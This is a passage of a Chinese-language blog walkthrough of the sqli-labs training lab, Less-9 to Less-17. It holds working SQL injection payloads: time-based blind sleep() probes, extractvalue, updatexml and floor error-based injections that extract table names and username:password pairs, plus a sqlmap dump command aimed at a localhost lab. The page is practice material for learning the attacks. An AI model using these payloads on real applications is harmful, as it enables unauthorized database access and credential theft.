<pre><code>python sqlmap.py -u http://localhost:8088/sqlilabs/Less-9/?id=1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch</code></pre><h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p>?id=1” and sleep(5) %23</p>
<p>同上</p>
<h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p>
<p>uname=admin’ and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt=""></p>
<p>uname=admin’ and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</p>
<p><img src="%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt=""></p>
<p>存在报错型注入，我们使用extractvalue()函数。</p>
<p><strong>爆数据库</strong></p>
<p>uname=admin’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt=""></p>
<p><strong>爆表名</strong></p>
<p>uname=admin’ and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt=""></p>
<p><strong>爆列名</strong></p>
<p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=’users’),0x7e))%23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt=""></p>
<p><strong>爆用户名密码</strong></p>
<p>uname=admin’ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt=""></p>
<p>sqlmap自动化注入：</p>
<p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p>
<h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p>
<p><strong>爆数据库名</strong>：</p>
<p>uname=admin” and extractvalue(1,concat(0x7e,(select database(),0x7e)))  “%23</p>
<p><strong>爆表名</strong>：</p>
<p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and “ </p>
<p><strong>爆列名</strong>：</p>
<p>uname=admin”  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’users’)))  and “<br><strong>爆用户名密码：</strong></p>
<p>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</p>
<h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p>
<p>1’) union select count(<em>),concat_ws(‘~’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
<p>1’) union select count(<em>),concat_ws(‘:’,(select user()),(select database()),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
<p><strong>爆表名</strong></p>
<p>‘) union select count(<em>),concat_ws(‘++’,(select table_name from information_schema.tables where table_schema=’security’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
<p><strong>爆列名</strong></p>
<p>‘) union select count(<em>),concat_ws(‘+’,(select column_name from information_schema.columns where table_name=’users’ limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
<p><strong>爆数据</strong></p>
<p>‘) union select count(<em>),concat_ws(‘;’,(select username from users limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a#</p>
<h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p>
<p>过程同上。</p>
<h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p>
<p>admin’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) # </p>
<p>逐个判断即可；</p>
<h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p>
<p>使用延时注入</p>
<p>同上。</p>
<h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p>
<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</p>
<p><strong>爆表名</strong></p>
<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=’security’ limit 3,1),0x5c),1))#submit=submit</p>
<p><strong>爆字段名</strong></p>
<p>uname=admin&amp;passwd=1’ and (updatexml(1,concat(0x5c,(select password from (select password from users where username=’admin’)aa),0x5c),1))#submit=submit</p>
<p><strong>未完待续。。。。</strong></p>
<h5 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h5>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/">&lt;i class&#x3D;&quot;fa fa-angle-left&quot;&gt;&lt;&#x2F;i&gt;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
                alt="Shu1L" />
            
              <p class="site-author-name" itemprop="name">Shu1L</p>
              <p class="site-description motion-element" itemprop="description">欢迎来到Shu1L的神秘小屋！</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">40</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">27</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Shu1L</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
